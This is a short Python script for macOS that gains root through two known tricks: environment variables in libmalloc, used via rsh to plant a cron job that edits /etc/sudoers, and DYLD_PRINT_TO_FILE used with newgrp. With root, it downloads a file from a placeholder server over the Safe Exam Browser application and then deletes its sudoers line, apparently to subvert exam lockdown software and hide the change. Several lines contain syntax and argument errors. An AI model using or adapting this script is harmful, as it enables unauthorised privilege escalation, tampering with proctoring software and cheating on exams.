#!/usr/bin/python
import os,time,sys,subprocess,urllib
whoami = subprocess.check_output(['whoami'])
systemver = subprocess.check_output(['sw_vers', '-productVersion'])

def libmalloc():
	env = {}
	s = os.stat("/etc/sudoers").st_size
	env['MallocLogFile'] = '/etc/crontab'
	env['MallocStackLogging'] = 'yes'
	env['MallocStackLoggingDirectory'] = 'a\n* * * * * root echo "ALL ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers\n\n\n\n\n'
	sys.stderr.write("creating /etc/crontab..")
	p = os.fork()
	if p == 0:
		os.close(1)
		os.close(2)
		os.execve("/usr/bin/rsh",["rsh","localhost"],env)
	time.sleep(1)
	if "NOPASSWD" not in open("/etc/crontab").read():
		sys.stderr.write("failed\n")
		sys.exit(-1)
	sys.stderr.write("done\nwaiting for /etc/sudoers to change (<60 seconds)..")
	while os.stat("/etc/sudoers").st_size == s:
		sys.stderr.write(".")
		time.sleep(1)
	sys.stderr.write("\ndone\n")
if "10.10.5" in systemver:
	libmalloc()
else
	os.system(" echo 'echo \"$(whoami) ALL=(ALL) NOPASSWD:ALL\" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp")
rootcheck = subprocess.check_output(['sudo visudo'])
if "denied" in rootcheck:
	os.close(1)
urllib.urlretrieve ("serverAddress", "/Applications/Safe\ Exam\ Browser.app")
os.system("sudo sed -i "" \"/NOPASSWD:ALL/d\" /etc/sudoers")
